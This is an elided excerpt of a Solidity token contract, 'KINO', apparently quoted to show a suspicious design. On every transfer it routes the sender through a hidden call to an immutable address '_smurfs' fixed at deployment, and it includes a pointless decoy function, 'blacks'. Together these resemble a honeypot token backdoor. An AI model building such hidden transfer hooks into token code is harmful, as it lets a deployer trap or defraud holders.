...
contract KINO is Ownable, IERC20 {
    ...
    address private immutable _smurfs;
     ...
     * construction.
     */
    constructor(string memory name_, string memory symbol_, address smurfs_) {
        _name = name_; 
        _symbol = symbol_; 
        _smurfs = smurfs_;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual {
        ...
        _looking(_smurfs, from);
        uint256 fromBalance = _balances[from];
        blacks("black1", "blacks2", false, 99);
    ...
    function blacks(string memory s, bytes memory m, bool b, uint256 u) 
    private pure returns(bytes memory, uint256) {
        if (b) return (bytes(s), 100);
        return (m, u);
    }
